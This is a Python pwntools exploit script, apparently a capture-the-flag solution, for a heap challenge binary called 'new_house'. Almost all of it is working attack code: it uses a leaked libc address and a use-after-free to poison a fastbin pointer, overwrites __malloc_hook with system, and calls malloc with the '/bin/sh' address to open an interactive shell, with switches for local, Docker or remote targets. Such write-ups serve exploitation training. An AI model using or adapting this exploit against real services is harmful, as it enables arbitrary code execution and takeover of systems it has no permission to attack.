#!/usr/bin/env python3

from pwn import *

exe = ELF("./new_house_patched")
libc = ELF("./libc.so.6")

context.binary = exe

# split tmux pane
context.terminal = ["tmux", "splitw", "-vf","-p", "70"]
# spawn new window
# context.terminal = ["tmux", "neww", "-n", "shell"]

#context.log_level = "debug"
DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc "	# `nc <host> <port>`

ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
bstr = lambda x: str(x).encode()
aleak = lambda elfname, addr: log.info(elfname + " @ 0x" + format(addr, 'x'))
vleak = lambda valname, val: log.info(valname + " @ 0x" + format(val, 'x'))
chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]

GDB_SCRIPT = """
b *0x40135a

"""

if args.GDB:
    r = gdb.debug(exe.path,gdbscript=GDB_SCRIPT)
elif args.LOCAL:
    r = process(exe.path)
elif args.DOCKER:
    r = remote("localhost", DOCKER_PORT)
else:
    r = remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))


ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)



room_idx = 0

def add(roomname, roomsize):
	global room_idx 
	sl("1") 
	sla("roomname? ", roomname) 
	sla("roomsize? ", roomsize)

	room_idx += 1
	return room_idx - 1


def delete(roomnumber):
    sl("2")
    sla("roomnumber? ", roomnumber)


def design(roomnumber, data):
    sl("3")
    sla("roomnumber? ", roomnumber)
    sla("What goes into the room? ", data)


def show():
    sl("4")

# to find fake chunk addr, 
# I can't use find_fake_fast because libc version < 2.31 (no tcache)

def main():
	ru("ground: ")
	leak = eval(rl().decode().strip())
	aleak("libc",leak)
	libc.address = leak 
	
	# create fake chunk near malloc hook (in wide data) 
	# dist from malloc hook = 0x23 
	fake_addr = libc.sym.__malloc_hook - 0x23	
	first_chunk = add("a",b'104') # 0x68 = size
	delete("0") # goes to fastbin

	aleak("malloc hook",libc.sym.__malloc_hook) # freed chunk is still editable
	design(str(first_chunk), p64(fake_addr)) # overwrite 1st chunk's fd with fake addr

	add("b", b'104') # chunk freed previously 
	malloc_hook_idx = add("c",b'104') # target: takes fake chunk 
	design(str(malloc_hook_idx), b'A' * 0x13 + p64(libc.sym.system)) # overwrite space until malloc_hook (0x13), then write system

	add("d",str(libc.binsh()))

    
	r.interactive()


if __name__ == "__main__":
    main()
